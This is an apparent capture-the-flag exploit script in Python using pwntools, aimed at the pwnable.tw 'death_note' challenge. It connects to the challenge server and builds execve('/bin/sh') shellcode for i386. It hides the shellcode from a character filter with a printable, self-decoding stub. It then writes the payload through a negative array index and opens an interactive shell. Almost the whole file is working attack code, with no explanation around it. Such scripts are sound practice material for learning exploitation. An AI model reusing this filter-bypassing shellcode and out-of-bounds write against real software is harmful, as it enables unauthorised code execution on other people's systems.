from pwn import *
import sys
from LibcSearcher import LibcSearcher

#MyTemplate
program = 'death_note'
elf = ELF(program,checksec=False)
lokal = False
context.arch = 'i386'

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False


if lokal:
    xp = elf.process()
    # libc = "a"
else:
    host = 'chall.pwnable.tw'
    port = '10201'
    xp = remote(host,port)
    #libc = ELF("givenlibc",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ["tmux","splitw","-h"]
    cmd = "b *0x080487ef \n c"
    gdb.attach(xp,cmd)

#Exploit Here

def add(idx,content):
	sla("choice :","1")
	sla("Index :",str(idx))
	sla("Name :",content)

def show(idx):
	sla("choice :","2")
	sla("Index :",str(idx))

def free(idx):
	sla("choice :","3")
	sla("Index :",str(idx))


shloc = 0x804b1a0

shellcode = asm('push 0x%08x' % unpack('/sh\x00', 32))
shellcode += asm('push 0x%08x' % unpack('/bin', 32))
shellcode += asm('push esp')
shellcode += asm('pop ebx')
shellcode += asm('xor ecx, ecx')
shellcode += asm('xor edx, edx')
shellcode += asm('xor esi, esi')
shellcode += asm('xor eax, eax')
shellcode += asm('mov al, SYS_execve')
shellcode += asm('int 0x80')

#original
shellcode = "\x68\x2f\x73\x68"
shellcode += "\x00" #\x70
shellcode += "\x68\x2f\x62\x69\x6e\x54\x5b\x31"
shellcode += "\xc9" #\x39
shellcode += "\x31"
shellcode += "\xd2" #\x42
shellcode += "\x31"
shellcode += "\xf6" #\x66
shellcode += "\x31"
shellcode += "\xc0\xb0\x0b\xcd" #\x30\x21\x7c\x3d
shellcode += "\x80" #\x60

#encoded
shellcode = "\x68\x2f\x73\x68"
shellcode += "\x70" #\x00
shellcode += "\x68\x2f\x62\x69\x6e\x54\x5b\x31"
shellcode += "\x39" #\xc9
shellcode += "\x31"
shellcode += "\x42" #\xd2
shellcode += "\x31"
shellcode += "\x66" #\xf6
shellcode += "\x31"
shellcode += "\x30\x21\x7c\x3d" #\xc0\xb0\x0b\xcd
shellcode += "\x60" #\x80


sh = asm('push 0x70707070')
sh += asm('push 0x70707070')
sh += asm('pop ecx')
sh += asm('sub byte ptr[edx + 36], cl')
sh += asm('sub byte ptr[edx + 45], cl')
sh += asm('sub byte ptr[edx + 47], cl')
sh += asm('sub byte ptr[edx + 49], cl')
sh += asm('sub dword ptr[edx + 51], ecx')
sh += asm('sub byte ptr[edx + 55], cl')
sh += asm('sub byte ptr[edx + 55], cl')
sh += shellcode

print sh
add(-16,sh)

xp.interactive()
